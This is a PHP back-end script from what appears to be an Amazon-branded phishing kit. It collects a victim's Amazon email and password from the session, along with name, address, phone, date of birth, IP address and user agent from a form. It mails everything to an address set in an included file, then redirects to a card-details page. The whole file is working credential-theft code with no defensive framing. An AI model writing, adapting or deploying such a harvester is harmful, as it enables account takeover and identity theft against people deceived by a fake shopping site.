<?php
session_start();
$rand = @$_GET['dispatch'];
date_default_timezone_set("Africa/Tunis");
include '../email.php';

$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
	$msg .= "<div style='font-size:13px;font-family:monospace'>";
	$msg .= "<b>--------------------[Amazon__2016]--------------------</b><br>";
	$msg .= "<span style='color:green'>MAIL = </span><b>".$_SESSION['email']."</b><br>\n";
	$msg .= "<span style='color:green'>PASS = </span><b>".$_SESSION['password']."</b><br>\n";
	$msg .= "<b>----------------------------------------</b><br>";
	$msg .= "<span style='color:green'>First Name </span>= <b>".$_POST['1']."</b><br>\n";
	$msg .= "<span style='color:green'>Last Name </span>= <b>".$_POST['2']."</b><br>\n";
	$msg .= "<span style='color:green'>Address 1 </span>= <b>".$_POST['3']."</b><br>\n";
	$msg .= "<span style='color:green'>Address 2 </span>= <b>".$_POST['4']."</b><br>\n";
	$msg .= "<span style='color:green'>City = </span><b>".$_POST['5']."</b><br>\n";
	$msg .= "<span style='color:green'>State = </span><b>".$_POST['6']."</b><br>\n";
	$msg .= "<span style='color:green'>ZIP = </span><b>".$_POST['7']."</b><br>\n";
	$msg .= "<span style='color:green'>Country = </span><b>".$_POST['country']."</b><br>\n";
	$msg .= "<span style='color:green'>Phone = </span><b>".$_POST['9']."</b><br>\n";
	$msg .= "<span style='color:green'>Date of Birth [ DD/MM/YYY ] = </span><b>".$_POST['10']."</b><br>\n";
	$msg .= "<b>--------------------[Automated Information]--------------------</b><br>";
	$msg .= "<span style='color:green'>OOIP = </span><b>".$ip."</b><br>\n";
	$msg .= "<span style='color:green'>TIME = </span><b>".$time."</b><br>\n";
	$msg .= "<span style='color:green'>DATE = </span><b>".$date."</b><br>\n";
	$msg .= "<span style='color:green'>USER = </span><b>".$userag."</b><br>\n";
	$msg .= "<b>--------------------[End.]--------------------</b><br>";
	$msg .= "</div>";
	$msg = wordwrap($msg, 70);
	$sub = "[Amazon Info] | ".$ip." | ". $_SESSION['email'] . " | ";
	$head = "MIME-Version: 1.0" . "\r\n";
	$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$head .= "From: AYB SCH Amazon V1";

	mail($to,$sub,$msg,$head);
	header("location: ../websec_card.php?dispatch=$rand")
?>
